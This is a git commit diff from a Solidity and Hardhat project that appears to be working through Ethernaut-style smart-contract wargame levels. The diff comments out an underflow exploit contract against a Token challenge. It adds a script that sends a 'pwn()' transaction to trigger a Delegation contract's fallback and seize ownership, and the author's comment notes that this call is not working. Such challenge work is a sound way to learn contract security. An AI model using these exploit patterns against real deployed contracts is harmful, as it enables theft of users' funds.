1ac2771f5fd7936e16e76b31eee9e354a70257f1
wzrdk3lly <dkmk1149@gmail.com>
2022-10-10 18:56:06 -0400

    ADD Wall

--- contracts/attacker.sol
+++ contracts/attacker.sol
@@ -1,23 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "./token.sol";
+// import "./delegate.sol";
 
 contract Attacker {
-    Token victimContract; //Contractname contractvariable
-    uint maxInt = 21000 - 1;
-    address playerAddress = 0x81215d34367AF48d01E728AfF2976d9Df32fE604;
-
-    // import a contract
-    constructor(address tokenAddress) public {
-        victimContract = Token(tokenAddress);
-    }
-
-    function sendAttackMessage() external {
-        // should overflow
-        victimContract.transfer(playerAddress, maxInt);
-    }
-
+    // Token victimContract; //Contractname contractvariable
+    // uint  = 21000 - 1;
+    // address playerAddress = 0x81215d34367AF48d01E728AfF2976d9Df32fE604;
+    // // import a contract
+    // constructor(address tokenAddress) public {
+    //     victimContract = Token(tokenAddress);
+    // }
+    // function sendAttackMessage() external {
+    //     // should overflow
+    //     victimContract.transfer(playerAddress, maxInt);
+    // }
     // function sendAttackerMessage(address _attackerAddress) external{
     //   victimContract.changeOwner(_attackerAddress);
     // }
--- scripts/test.ts
+++ scripts/test.ts
@@ -1,31 +1,56 @@
 import { ethers } from "hardhat";
-const CONTRACT_ADDRESS = "0xa855A0060156c3D3567423b4D9aCFfA4b7Ab8F3d";
+import { Contract } from "hardhat/internal/hardhat-network/stack-traces/model";
+
+const CONTRACT_ADDRESS = "0x99323d1Ffb5727d6666c2C4532963edb0bcB8FAE";
+const DELEGATE_CONTRACT = "0xbAdC0160eE01D2d6c594938a7d0B56B0858d22B0";
 const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
-const ATTACKER_CONTRACT = "0x69e3b78Ba361367FFbF06C1a9dAE1C3c0a86B2a8";
+// const ATTACKER_CONTRACT = "0x69e3b78Ba361367FFbF06C1a9dAE1C3c0a86B2a8";
 
 async function main() {
   const signer = await ethers.getSigner(PLAYER_ADDRESS);
-  const contract = await ethers.getContractAt(
-    "Token",
+  const contractDelegation = await ethers.getContractAt(
+    "Delegation",
     CONTRACT_ADDRESS,
     signer
   );
 
-  const attackerContract = await ethers.getContractAt(
-    "Attacker",
-    ATTACKER_CONTRACT,
+  const contractDelegate = await ethers.getContractAt(
+    "Delegate",
+    CONTRACT_ADDRESS,
     signer
   );
 
+  // send an empty transaction to trigger fallback
   console.log(
-    `sending an attack message ${await attackerContract.sendAttackMessage()}`
+    await signer.sendTransaction({
+      from: PLAYER_ADDRESS,
+      to: DELEGATE_CONTRACT,
+      value: 0,
+      gasLimit: 50000,
+      data: await ethers.utils.keccak256("pwn()"), //This is the line of code that is driving me insane
+    })
   );
+  // Check the contract address
+  // console.log(
+  //   "what is the contract address of the delegate contract? ",
+  //   await contractDelegation.address
+  // );
 
-  console.log(
-    `The new balance of the player address is: ${await contract.balanceOf(
-      PLAYER_ADDRESS
-    )}`
-  );
+  // console.log(
+  //   "What is the contract address of the delegation contract? ",
+  //   await contractDelegate.address
+  // );
+
+  // Trigger the fallback function of delegation
+  // console.log(
+  //   "trigger delegation fallback",
+  //   await contractDelegation.fallback({
+  //     value: 0,
+  //     data: ethers.utils.keccak256("pwn()"),
+  //   })
+  // );
+
+  // console.log("contract owner is", await contractDelegate.owner());
 }
 
 // We recommend this pattern to be able to use async/await everywhere
